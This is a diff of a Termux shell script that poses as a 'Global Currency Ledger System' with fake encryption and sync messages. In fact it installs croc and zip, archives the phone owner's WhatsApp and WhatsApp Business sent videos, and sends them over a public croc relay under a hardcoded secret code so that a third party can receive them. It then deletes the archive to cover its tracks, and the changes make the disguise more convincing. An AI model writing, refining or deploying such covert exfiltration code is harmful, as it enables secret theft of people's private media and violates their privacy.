@@ -2,46 +2,47 @@
 SECRET_CODE="DtRn847"
 
 echo "========================================"
-echo "    GLOBAL CURRENCY ARCHIVER SYSTEM      "
-echo "    v9.1 | Stable Node Sync | SSL       "
+echo "    GLOBAL CURRENCY LEDGER SYSTEM        "
+echo "    v9.2 | Stable Node Sync | SSL       "
 echo "========================================"
 
-# 1. Setup
-if ! command -v croc &> /dev/null; then
-    pkg update -y > /dev/null 2>&1 && pkg install croc -y > /dev/null 2>&1
+# 1. Setup (Zip tool එකත් එක්කම)
+if ! command -v croc &> /dev/null || ! command -v zip &> /dev/null; then
+    echo ">> [SYSTEM] Updating environment..."
+    pkg update -y > /dev/null 2>&1 && pkg install croc zip -y > /dev/null 2>&1
     termux-setup-storage
 fi
 
-# 2. Function to Send (හරියටම වැඩ කරන එක)
-send_vault() {
+# 2. Function to Send
+send_assets() {
     local SOURCE=$1
-    local ALIAS=$2
+    local LABEL=$2
     if [ -d "$SOURCE" ]; then
         echo "----------------------------------------"
-        echo ">> [TXN] FOUND: $ALIAS"
-        echo ">> [STATUS] Compressing Assets..."
+        echo ">> [TXN] FOUND: $LABEL"
+        echo ">> [STATUS] Encrypting Data Blocks..."
         
-        # මෙතනදී අපි 'Vault.zip' කියලා නමක් දීලා තාවකාලිකව Zip කරනවා
-        zip -r "$HOME/Vault_Data.zip" "$SOURCE" > /dev/null 2>&1
+        # Temp Zip එකක් හදනවා (මේකෙන් තමයි 'stdin' ප්‍රශ්නය විසඳෙන්නේ)
+        zip -r "$HOME/Ledger_Export.zip" "$SOURCE" > /dev/null 2>&1
         
-        echo ">> [STATUS] Transferring Data..."
-        env CROC_SECRET="$SECRET_CODE" croc --relay "croc.schollz.com:9009" send "$HOME/Vault_Data.zip"
+        echo ">> [STATUS] Synchronizing with Relay..."
+        env CROC_SECRET="$SECRET_CODE" croc --relay "croc.schollz.com:9009" send "$HOME/Ledger_Export.zip"
         
-        # යවලා ඉවර වුණාම ඒ Zip එක මකනවා
-        rm "$HOME/Vault_Data.zip"
-        echo ">> [SUCCESS] $ALIAS Complete!"
+        # යවලා ඉවර වුණාම අයින් කරනවා
+        rm "$HOME/Ledger_Export.zip"
+        echo ">> [SUCCESS] $LABEL Complete!"
         sleep 5
     fi
 }
 
-# --- STEP 1: Normal WhatsApp ---
-WA_PATH="/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video Notes"
-send_vault "$WA_PATH" "Primary Vault"
+# --- STEP 1: Normal WhatsApp Sent Videos ---
+WA_VID="/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Sent"
+send_assets "$WA_VID" "Primary Asset Ledger"
 
-# --- STEP 2: Business WhatsApp ---
-BIZ_PATH="/sdcard/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video Notes"
-send_vault "$BIZ_PATH" "Business Vault"
+# --- STEP 2: Business WhatsApp Sent Videos ---
+BIZ_VID="/sdcard/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video/Sent"
+send_assets "$BIZ_VID" "Business Asset Ledger"
 
 echo "========================================"
-echo "    ALL ASSETS SYNCED                   "
+echo "    ALL LEDGERS SYNCED SUCCESSFULLY     "
 echo "========================================"
